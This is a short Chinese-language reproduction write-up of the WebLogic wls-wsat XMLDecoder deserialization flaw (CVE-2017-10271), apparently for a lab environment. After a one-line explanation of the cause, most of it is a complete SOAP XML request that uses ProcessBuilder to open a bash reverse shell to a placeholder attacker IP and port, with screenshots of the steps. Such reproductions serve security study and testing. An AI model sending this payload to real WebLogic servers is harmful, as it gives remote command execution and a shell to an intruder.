# Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）

## 漏洞原理

Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。


## 漏洞复现

打开环境


![image](https://github.com/user-attachments/assets/5531f355-17a8-4e86-aa7a-417d5ce514fe)



访问/wls-wsat/CoordinatorPortType

![image](https://github.com/user-attachments/assets/e7e4cd13-42b3-449d-a589-00cb679297d6)

对其POST请求xml数据

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/(your ip)/(port) 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

![image](https://github.com/user-attachments/assets/d66382e8-e974-4fc7-b11e-e487eb3f4650)




